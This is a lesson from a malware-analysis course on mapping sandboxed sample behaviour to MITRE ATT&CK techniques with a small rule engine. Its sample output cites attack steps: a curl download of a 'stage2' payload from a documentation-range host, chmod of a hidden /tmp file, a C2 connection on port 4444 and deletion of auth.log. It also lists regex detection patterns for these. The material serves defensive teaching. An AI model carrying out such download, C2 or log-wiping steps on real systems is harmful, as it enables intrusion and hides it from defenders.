# Module 3.4 — MITRE ATT&CK Mapping

> Raw behavior is hard to communicate; ATT&CK is the shared language that turns
> "it ran curl and chmod and connected to a weird port" into techniques a whole
> defensive team understands. This module teaches you to map behavior to ATT&CK
> — and shows you the exact rule engine Detonate uses to do it automatically.

- **Level:** 3 — Dynamic Analysis
- **Time:** ~60 minutes
- **Difficulty:** Intermediate

---

## Objectives

By the end of this module you will be able to:

- [ ] Explain tactics vs techniques and why ATT&CK matters.
- [ ] Map observed behaviors to specific technique IDs with evidence.
- [ ] Read and extend a behavioral rule engine.
- [ ] Critique a mapping (confidence, false positives, gaps).

## Prerequisites

- [Modules 3.1–3.3](../). `python3`.

---

## Theory

**MITRE ATT&CK** is a catalog of adversary behavior organized as:
- **Tactics** — the *why* (the goal): Execution, Persistence, Defense Evasion,
  Command and Control, Exfiltration, ...
- **Techniques** — the *how*: e.g. `T1059.004` (Unix Shell), `T1105` (Ingress
  Tool Transfer), `T1071.001` (Web Protocols), `T1041` (Exfiltration Over C2).

Why bother? Because "T1059.004 + T1105" instantly tells any analyst "it used a
shell to download a tool," drives **detection coverage** decisions, and lets you
**compare** samples and actors on common ground.

### How automated mapping works

A **behavioral rule** inspects the structured analysis result and emits evidence
when a pattern matches. Detonate's engine
([`api/detonate/services/mitre/rules.py`](../../../api/detonate/services/mitre/rules.py),
**26 rules**) has three rule kinds:
- **ProcessRule** — regex over process command lines (e.g. `\bcurl\b` → T1105).
- **NetworkRule** — destination ports/protocols (e.g. port 80/443 → T1071.001;
  non-standard port → T1041).
- **FileRule** — path/operation patterns (e.g. writing a systemd unit → T1543.002).

Each match gets a **confidence** from how many times it fired.

---

## Lab

You'll run a teaching-sized clone of that engine over a synthetic result, then
read the real thing.

**Files:** [`sample_analysis.json`](sample_analysis.json) (a dynamic result in
Detonate's shape) and [`map_attack.py`](map_attack.py) (a ~60-line faithful
subset of the real engine).

### Task 1 — Map it

```bash
python3 map_attack.py sample_analysis.json
```

Real output:

```
Mapped 7 ATT&CK techniques from sample_analysis.json:

  T1041       Exfil Over C2 (non-standard port)   <- tcp://192.0.2.99:4444
  T1059.004   Unix Shell                          <- /bin/sh -c curl ...
  T1059.006   Python                              <- python3 -c ...
  T1071.001   Web Protocols                       <- tcp://192.0.2.50:80
  T1071.004   DNS                                 <- dns:c2.example.com
  T1105       Ingress Tool Transfer               <- curl http://192.0.2.50/stage2 ...
  T1222.002   Linux File Permissions Modification <- chmod +x /tmp/.x
```

### Task 2 — Verify two mappings by hand

Pick `T1105` and `T1041`. Trace each back to the evidence in
`sample_analysis.json`:
- `T1105` fires because a process command matches `\bcurl\b` (downloads a tool).
- `T1041` fires because there's a connection to port **4444**, which is *not* in
  the standard set `{53,80,443,8080,8443,22,123}` — non-standard outbound =
  possible exfil/C2.

### Task 3 — Find a gap, then extend the engine

The sample also **deletes `/var/log/auth.log`** (`files_deleted`). That's
**Indicator Removal: Clear Linux Logs (T1070.002/T1070)** — but `map_attack.py`
has no FileRule for it, so it's missed. Add one:

```python
# in map_attack.py, add a file-based check:
FILE_RULES = [("T1070", "Indicator Removal (log deletion)",
               [r"/var/log/", r"auth\.log", r"\.bash_history"])]
```

Implement a `match_files()` that scans `files_deleted`/`files_modified` against
those patterns, and confirm `T1070` now appears. **Finding what the rules miss
is a real analyst skill** — automated mapping is a floor, not a ceiling.

### Task 4 — Through Detonate

Run Detonate's MITRE mapping on a real detonation
(`POST /submissions/{id}/analyses/{id}/mitre`) and read the **tactic-coverage
matrix** and confidence scores. Compare its richer 26-rule output to your subset.

---

## Guided questions

1. What's the difference between a tactic and a technique? Give the tactic for
   `T1105` and for `T1041`.
2. `T1071.001` and `T1041` both fired on network connections. Why did port 80
   map to one and port 4444 to the other?
3. The engine missed the log deletion. Is a "missed" technique a bug in the
   sample or a limitation of the rules? What does that tell you about trusting
   automated mapping?
4. Why attach a **confidence** to each mapping instead of a yes/no?
5. A rule maps `\bpython[23]?\b` to T1059.006. How could that cause a **false
   positive**, and how would you tighten it?

---

## Solution

<details>
<summary>Spoiler — open after attempting.</summary>

1. A **tactic** is the adversary's goal; a **technique** is the specific method.
   `T1105` (Ingress Tool Transfer) is under the **Command and Control** tactic;
   `T1041` (Exfiltration Over C2 Channel) is under **Exfiltration**.
2. The NetworkRule for **T1071.001** lists standard web ports `{80,443,8080,8443}`,
   so the port-80 connection matched it. **T1041** is the *exclusion* rule: it
   matches any connection whose port is **not** in the standard set
   `{53,80,443,8080,8443,22,123}` — and 4444 isn't, so it flags as possible
   exfil/C2 over a non-standard port.
3. It's a **limitation of the rule set**, not the sample — the behavior happened;
   no rule covered it. Lesson: **automated ATT&CK mapping is a floor**. It gives
   fast, consistent coverage but misses what nobody wrote a rule for, so a human
   must review for gaps (and over-claims).
4. Behavior is **probabilistic evidence**, not proof. One `sh` invocation is weak
   evidence of "shell execution as a TTP"; five distinct ones is strong.
   Confidence (Detonate scales it by match count) lets consumers prioritize and
   avoids treating a single incidental match as a confirmed technique.
5. A legitimate program that merely *invokes python for a benign reason* (a build
   script, an installer) would match `\bpython[23]?\b` and get tagged T1059.006 —
   a false positive. Tighten by requiring **suspicious arguments** (`-c`,
   `base64`, `-e`, inline code, network calls) to co-occur, not just the
   interpreter name — the same brittle-vs-robust trade-off as YARA
   ([Module 2.4](../../02-static-analysis/04-writing-yara-rules/)).

</details>

---

## Going further

- Implement `match_files()` (Task 3) and the systemd-persistence rule
  (`T1543.002`); compare your additions to the real definitions in `rules.py`.
- Pull the full ATT&CK dataset (`make mitre-pull`) and browse the techniques your
  mappings reference.
- Next: **[Level 4 — Unpacking & Deobfuscation](../../04-unpacking-deobfuscation/)**.
